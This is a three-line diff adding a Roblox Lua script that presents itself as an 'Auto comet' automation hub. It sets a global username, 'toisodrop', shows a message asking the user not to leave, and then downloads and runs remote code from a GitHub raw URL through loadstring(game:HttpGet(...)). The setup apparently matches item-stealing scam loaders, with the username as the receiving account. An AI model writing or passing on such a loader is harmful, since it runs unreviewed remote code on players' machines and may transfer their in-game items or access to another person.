@@ -1,0 +1,3 @@
+_G.Username = "toisodrop"
+_G.HubName = "Auto comet script are loading, please don't leave"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
